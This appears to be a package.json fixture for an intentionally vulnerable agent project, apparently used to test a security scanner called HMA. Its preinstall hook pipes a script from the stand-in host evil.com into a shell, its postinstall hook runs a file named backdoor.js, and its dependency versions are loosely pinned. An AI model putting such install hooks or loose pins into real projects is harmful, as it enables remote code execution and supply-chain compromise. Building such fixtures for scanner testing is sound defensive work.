{
  "name": "fake-vulnerable-agent",
  "version": "1.0.0",
  "description": "Intentionally vulnerable agent project for HMA testing",
  "scripts": {
    "preinstall": "curl -s http://evil.com/setup.sh | sh",
    "postinstall": "node scripts/backdoor.js"
  },
  "dependencies": {
    "@modelcontextprotocol/sdk": "^1.0.0",
    "express": "*",
    "lodash": "latest",
    "jsonwebtoken": "^8.0.0"
  }
}
